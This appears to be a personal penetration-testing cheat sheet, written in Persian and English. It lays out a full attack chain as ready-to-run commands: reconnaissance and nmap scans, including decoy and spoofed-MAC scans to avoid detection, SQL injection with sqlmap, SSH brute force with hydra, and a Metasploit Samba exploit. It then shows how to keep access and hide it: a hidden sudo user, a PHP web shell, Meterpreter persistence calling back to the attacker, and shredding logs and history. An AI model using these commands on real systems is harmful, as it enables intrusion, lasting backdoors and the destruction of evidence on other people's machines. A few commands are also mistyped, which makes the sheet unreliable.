📊 مقایسه حالت‌های شبکه برای تست نفوذ
حالت شبکه	تست نفوذ بی‌سیم	تست شبکه داخلی	دسترسی اینترنت	امنیت
NAT		❌				❌			✅		✅✅✅
Bridged	✅				✅			✅		  ❌
Host-Only	❌				✅			❌		✅✅✅
Internal	❌				✅			❌	     ✅✅✅✅

کشف دستگاه‌های فعال در شبکه
sudo netdiscover -r 192.168.1.0/24

[
  1. Reconnaissance :
    [
      passive : جمع آوری اطلاعات از منابع عمومی
      [
        // دریافت نام و ادرس و تماس صاحب سرور ها
        whois ["website"]

        // بررسی اطلاعات dns 
        nslookup ["website"]
        dig any ["website"]

        // جستجو subdomain
        sublist3r -d ["website"]
        amass enum -d ["website"]
      ] 

      active : جمع‌آوری اطلاعات از منابع محدود و خصوصی
      [
        netdiscover -r [ip]
        nmap -sn [ bound ips]
      ]
    ]

  2. Scanning : 
    [
      port scaning : 
      [
        quick scan => nmap -sS -T4 [ip]
        all scan => nmap -p- -T4 [ip] -oN [file name and address]
      ]
      service detection :
      [
        nmap -sV -sC -O [ip]
      ]
      vulnerabile scaning : 
      [
        secure script => nmap --script vuln [ip]
        web app => nikto -h [ip]
      ]

    ]
  
  3. Gaining Access :
    [
      web app attacking :
      [
        sqlmap -u ["url + /login.php?user=admin&pass=test"] --level=3 --risk=2
        if sucsess : ["url + /login.php?user=admin&pass=test"] --dbs 
      ]
      samba : 
      [
        shared list : smbclient -l [ip] -N 
        connection : smbclient //[ip]/public -N
        search file : smb:\ ...
      ]

      brute force :
      [
        hydra -l users.txt -P /usr/share/wordlists/rockyou.txt [ip] ssh -t 4
      ]
      
      metasploit : اگرsamba آسیب بذیر بود
      [
        msfconsole 
        search samba 4.7.6
        use exploit/linux/samba/is_known_pipename
        set RHOSTS [ip]
        exploit
        meterpreter > shell 
        whoami
      ]

      printer attack : 
      [
        echo "@PJL INFO ID" | [ip] 9100 
      ]
    ]

  4. Maintaining Access :
    [
      create backdoor :
      [
        0. useradd -r -m -s /bin/bash hiddenuser
        1. add hidden user => chpasswd
        2. add to sudo => tee -a /etc/sudoers
        3. setup ssh key [
          ssh-keygen -f ['name']
          ssh-copy-id -i ['name'].pub [username]@[ip]
        ]
      ]

      web shell : 
      [
        1. upload php shell => echo '<?php system($_GET["cmd"]); ?> /var/www/html/shell.php'
        2. access => curl "[ip]/shel.php?cmd=whoami"
      ]

      persistence with metasploit :
      [
        meterpreter > run persistence -S -U -i 60 -p 4444 -r [ip]
        // -s : اجرا هنگام راه اندازی
        // -U : اجرا هنگام لاگین کاربر
        // -i : اتصال ۶۰ ثانیه
        // -p : port
        // -r : ip kali
      ]
    ]

  5. Covering Track:
    [
      clear logs => shred -zu [/var/log/fils]
      clear history => history -c , rm ~/.bash_history
      clear temp file => rm -f /[var,tmp,dev]/[www,shm,backdoor] , meterpreter > clearev
      change date files
    ]
]



Nmap Tool :
[ 
  # اسکن کامل با تمام قابلیت‌ها

  sudo nmap -sS -sV -sC -O -p- -T4 -v -oA full_scan 192.168.1.100
  # -sS: SYN Stealth Scan
  # -sV: شناسایی سرویس/نسخه
  # -sC: اجرای اسکریپت‌های پیش‌فرض
  # -O: شناسایی سیستم عامل
  # -p-: همه پورت‌ها (1-65535)
  # -T4: سرعت تهاجمی
  # -v: نمایش جزئیات
  # -oA: خروجی همه فرمت‌ها

# کشف دستگاه‌های شبکه
nmap -sn 192.168.1.0/24

# سپس اسکن کامل مهم‌ترین دستگاه
sudo nmap -sS -sV -sC -O 192.168.1.1

# اسکن پورت‌های وب
nmap -p 80,443,8080,8443 --script http-enum,http-security-headers 192.168.1.1

# تست SSL/TLS
nmap -p 443 --script ssl-enum-ciphers,ssl-cert 192.168.1.1

#اسکن با اجتناب از تشخیص
sudo nmap -f -D RND:5 --data-length 50 --ttl 128 \
  --spoof-mac 0 --badsum -sS -sV \
  --scan-delay 2s -T2 -oN stealth_scan 192.168.1.1

# اسکن موازی
nmap -sS -p 80 192.168.1.0/24 --max-hostgroup 10 --max-parallelism 10

# اسکن با حفظ منابع
nmap -T2 --max-rate 100 192.168.1.0/24


# نمایش پکت‌های ارسالی
nmap --packet-trace 192.168.1.1

# نمایش دلیل بسته بودن پورت
nmap --reason 192.168.1.1

# تست DNS
nmap -sL --dns-servers 8.8.8.8 192.168.1.1


#بررسی امنیتی
# SSH
nmap --script ssh2-enum-algos 192.168.1.1
nmap --script ssh-auth-methods 192.168.1.1

# FTP
nmap --script ftp-anon,ftp-bounce 192.168.1.1

# SMB
nmap --script smb-vuln-ms17-010 192.168.1.1


#جمع‌آوری اطلاعات
nmap --script dns-brute example.com
nmap --script http-robots.txt 192.168.1.1
nmap --script whois-ip 8.8.8.8

#شناسایی آسیب‌پذیری:
nmap --script vuln 192.168.1.1
nmap --script exploit 192.168.1.1

# اسکن دوره‌ای
while true; do
  nmap -sn 192.168.1.0/24 -oG - | grep "Status: Up" >> network_log.txt
  date >> network_log.txt
  sleep 300  # هر 5 دقیقه
done
]
